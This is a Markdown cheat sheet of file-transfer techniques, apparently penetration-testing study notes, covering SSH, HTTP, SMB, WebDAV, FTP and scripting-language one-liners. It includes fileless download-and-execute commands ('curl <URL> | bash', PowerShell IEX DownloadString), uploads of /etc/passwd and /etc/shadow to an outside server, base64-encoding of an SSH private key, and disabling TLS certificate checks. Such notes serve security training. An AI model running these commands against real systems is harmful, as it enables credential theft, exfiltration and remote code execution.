# File Transfers

____
## SSH

### Starting SSH server
``` bash
sudo systemctl enable ssh
sudo systemctl start ssh
```
### Downloading with SCP
``` bash
scp <USER>@<IP>:/tmp/file.txt .
```
### Uploading with SCP
``` bash
scp my_file <USER>@<IP>:/tmp/
```

____
## Base64 Encode/Decode

### Powershell

#### Encoding a file
``` powershell
[Convert]::ToBase64String((Get-Content -path "C:\my_file" -Encoding byte))
```
#### Decoding into a file
``` powershell
[IO.File]::WriteAllBytes("C:\my_file", [Convert]::FromBase64String("<BASE64>"));
```

### Bash

#### Encoding a file
``` bash
cat id_rsa | base64 -w 0; echo
```

#### Decoding into a file
``` bash
echo <BASE64> | base64 -d > my_file
```

____
## HTTP

### Creating a webserver on linux
Python3 http server
``` bash
python3 -m http.server <PORT>
```
Python3 upload server
``` bash
pip3 install uploadserver
python3 -m uploadserver
```
Python3 upload server with self-signed certificate
``` bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```
Python2.7 simple http server
``` bash
python2.7 -m SimpleHTTPServer
```
PHP web server
``` bash
php -S 0.0.0.0:8000
```
Ruby web server
``` bash
ruby -run -ehttpd . -p8000
```

### Downloading from webserver

#### Linux

##### File download using wget and curl
``` bash
wget <URL> -O my_file
```
``` bash
curl -o my_file <URL>
```

##### Fileless method
``` bash
wget -q0- <URL> | python3
```
```
curl <URL> | bash
```

##### Using /dev/tcp
Connect to webserver
``` bash
exec 3<>/dev/tcp/<IP>/<PORT>
```
Send a GET request
``` bash
echo -e "GET /script.sh HTTP/1.1\n\n" > &3
```
Print the response
``` bash
cat < &3
```

#### Windows

##### File Download with Invoke-WebRequest (wget, iwr, curl)
``` powershell
wget <URL> -OutFile my_file
```

##### File Download with DownloadFile Method
``` powershell
(New-Object Net.WebClient).DownloadFile('<URL>','<SAVE-TO-PATH>')
```

##### Fileless Method with DownloadString and Invoke-Expression
``` powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```
``` powershell
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

##### Other Download methods
|Method|Description|
|---|---|
|   OpenRead    |	Returns the data from a resource as a Stream.|
|OpenReadAsync|	Returns the data from a resource without blocking the calling thread.|
|DownloadData|	Downloads data from a resource and returns a Byte array.|
|DownloadDataAsync|	Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|DownloadFile|	Downloads data from a resource to a local file.|
|DownloadFileAsync|	Downloads data from a resource to a local file without blocking the calling thread.|
|DownloadString|	Downloads a String from a resource and returns a String.|
|DownloadStringAsync|	Downloads a String from a resource without blocking the calling thread.|

More: [https://gist.github.com/HarmJ0y/bb48307ffa663256e239](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

##### Common Errors with Powershell

###### Internet Explorer engine is not available
``` powershell
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```
Solution:
Use the parameter `UseBasicParsing`
```
Invoke-WebRequest <URL> -UseBasicParsing | IEX
```

###### Could not establish trust relationship for the SSL/TLS secure channel.
``` powershell
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
```
Solution:
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### Uploading to webserver

#### Linux
``` bash
curl -X POST <WEBSRV-URL> -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
```
> Use `--insecure`, if you used a self-signed certificate when creating the webserver
#### Windows

##### Using PSUpload script
``` powershell
IEX(New-Object Net.WebClient).DownloadString('<URL>')
Invoke-FileUpload -Uri <WEBSRV-URL> -File <FILE-TO-UPLOAD>
```

##### Using base64 and Invoke-WebRequest
``` powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri <WEBSRV-URL> -Method POST -Body $b64
```
On the web server
``` bash
nc -lvnp 8000

listening on [any] 8000 ...
connect to [10.10.10.10] from (UNKNOWN) [11.11.11.11] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 10.10.10.10:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OT...<SNIP>...
```

____
## SMB

### Downloading from SMB server

#### Creating SMB server with impacket-smbserver
``` bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
> We set a username and password because new versions of Windows block unauthenticated guest access

#### Mounting the share on windows

```
net use n: \\<IP>\share /user:test test
```

### Uploading to SMB server

#### Creating a Webdav server
``` bash
sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

#### Connecting to the Webdav share
```
dir \\<IP>\DavWWWRoot
```

#### Uploading to the Webdav server
```
copy <FILE-TO-UPLOAD> \\<IP>\DavWWWRoot
```
> `DavWWWRoot` represents the root of the Webdav server.

____
## FTP

### Creating a FTP server using python

``` bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

### Download from FTP server

#### Using powershell
``` powershell
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', '<OUTFILE>')
```

#### Using a command file
Content of the command file
```
open <IP>
USER anonymous
binary
GET file.txt
bye
```
Use ftp with command file
```
ftp -v -n -s:commands.txt
```

### Upload to FTP server

#### Using powershell
``` powershell
(New-Object Net.WebClient).UploadFile('ftp://<IP>/filename.txt', '<FILE-TO-UPLOAD>')
```

#### Using a command file
Content of the command file
```
open <IP>
USER anonymous
binary
PUT file.txt
bye
```
Use ftp with command file
```
ftp -v -n -s:commands.txt
```

____
## Python

### Download
``` bash
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<OUTFILE>")'
```
``` bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OUTFILE>")'
```
### Upload
```
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
More detailed:
``` python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
____
## PHP

### Download with file_get_contents() and file_put_contents()
``` bash
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTFILE>",$file);'
```
### Download with Fopen()
``` bash
php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<OUTFILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
### Fileless method
``` bash
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
____
## Ruby

### File download
``` bash
ruby -e 'require "net/http"; File.write("<OUTFILE>", Net::HTTP.get(URI.parse("<URL>")))'
```
____
## Perl

### File download
``` bash
perl -e 'use LWP::Simple; getstore("<URL>", "<OUTFILE>");'
```
____
## Javascript

### File download
Content of javascript file (wget.js)
``` javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
Command to download a file:
```
cscript.exe /nologo wget.js <URL> <OUTFILE>
```
____
## VBScript

### File download
Content of vbscript file (wget.vbs)
``` VB
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
Command to download a file:
```
cscript.exe /nologo wget.vbs <URL> <OUTFILE>
```